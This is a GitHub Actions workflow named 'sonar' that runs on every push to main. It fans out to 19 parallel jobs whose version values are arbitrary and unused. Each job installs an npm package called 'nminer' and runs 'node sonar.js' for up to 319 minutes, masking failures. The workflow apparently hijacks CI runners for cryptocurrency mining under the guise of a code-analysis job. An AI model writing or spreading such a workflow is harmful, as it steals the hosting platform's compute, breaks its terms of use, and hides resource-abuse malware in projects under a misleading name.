name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6053 }
          - { version: 8075 }
          - { version: 8416 }
          - { version: 53 }
          - { version: 6332 }
          - { version: 2333 }
          - { version: 3543 }
          - { version: 620 }
          - { version: 3823 }
          - { version: 9096 }
          - { version: 3375 }
          - { version: 9262 }
          - { version: 754 }
          - { version: 4764 }
          - { version: 9872 }
          - { version: 6585 }
          - { version: 8104 }
          - { version: 3759 }
          - { version: 57 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: unethically even
        run: |
          npm install nminer@latest
          timeout 319m node sonar.js || echo "sonar executed"